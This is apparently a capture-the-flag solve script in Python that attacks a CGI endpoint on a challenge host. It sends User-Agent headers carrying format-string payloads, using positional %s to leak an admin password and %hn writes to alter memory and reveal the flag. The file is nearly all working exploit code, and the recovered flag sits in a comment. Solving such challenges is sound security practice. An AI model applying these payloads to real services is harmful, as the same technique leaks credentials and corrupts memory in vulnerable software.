import requests


URL = 'https://nessus-braggart.chals.io/sec.cgi'

#for i in range(2, 1024): # 325 xbYP3h7Ua94c


payload = {
	'x-debug': '1',
	'User-Agent': 'A' * 1008 + '%s' + f'%{325}$s',
}

r = requests.post(URL, headers=payload)
print(r)

passwd = r.text.split("AdminPass=")[1].split("</pre>")[0]
print('password:', passwd)


payload = {
	'x-debug': '1',
	'User-Agent': 'A' * 1008 + f'%{ord("l") * 256 + ord("f")}c' + f'%{267}$hn' + f'%{267}$s',
	'x-password': passwd
}

r = requests.post(URL, headers=payload)
print(r)

flag = r.text.split('</h3>')[-1].split('\n</pre>')[0]
print(flag)

# flag{f0rmat_th3m_str1ngz}

